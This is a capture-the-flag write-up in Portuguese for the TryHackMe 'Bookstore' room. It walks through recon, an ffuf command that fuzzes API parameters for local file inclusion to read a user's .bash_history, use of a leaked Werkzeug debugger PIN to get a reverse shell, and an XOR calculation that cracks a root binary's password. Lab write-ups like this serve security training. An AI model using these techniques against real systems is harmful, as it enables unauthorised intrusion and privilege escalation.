#ctf 

https://tryhackme.com/room/bookstoreoc

## Recon

Com NMAP

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))                  
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)               
```

Na porta 5000 está a api que possui uma documentação

```
/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```


Usando Run Collection do postman, todos os endpoints estão disponível na versão 1 exceto `/api/v2/resources/books/random4`.

Em `/assets/js/api.js` existe uma informação interessante "the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.". Isso significa que algum dos endpoints que possui parâmetros da versão 1 é vulnerável a **LFI**.

No HTML do login existe um comentário "Still Working on this page will add the backend support soon, also the debugger pin is inside ==sid=='s ==bash history== file", então é este arquivo que vamos acessar por LFI.

Com gobuster, foi descoberto um console em `http://IP:5000/console` que precisa de um PIN.
### Fuzzing

Nenhum dos parâmetros da documentação está sujeita a LFI, entao usando os [25 parâmetros mais comuns](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters)

```
ffuf -c -w wordlist.txt -u "http://10.10.168.25:5000/api/v1/resources/books?FUZZ=/home/sid/.bash_history" -mc 200
```

Encontramos o PIN: `123-321-135`

## Privesc

Para conseguir acesso à máquina basta usar o pin no console encontrado e rodar uma shell reversa com python (pois o terminal é o terminal interativo do python).

Existe um executável que roda como root chamado `try-harder`, usando o **strings** é possível ver que ele pede uma senha numérica e se acertar executa o terminal do root. Usando o **ghidra** para fazer uma engenharia reversa no código, temos o seguinte trecho:

```C
local_18 = 0x5db3;
puts("What\'s The Magic Number?!");
__isoc99_scanf(&DAT_001008ee,&local_1c);
local_14 = local_1c ^ 0x1116 ^ local_18;
if (local_14 == 0x5dcd21f4) {
system("/bin/bash -p");
}
else {
puts("Incorrect Try Harder");
}
```

Neste código, a variável `local_14` é comparada com `0x5dcd21f4` para acessar o terminal. Porém essa variável não é a que inserimos a que inserimos é a `local_1c`. Antes da comparação existe um XoR que precisamos resolver para conseguir o root.

```C
local_14 = local_1c ^ 0x1116 ^ local_18
0x5dcd21f4 = local_1c ^ (0x1116 ^ 0x5db3)
0x5dcd21f4 = local_1c ^ 0x4ca5
0x5dcd21f4 ^ 0x4ca5 = local_1c
0x5dcd6d51 = local_1c //1573743953 a senha em decimal
```

GG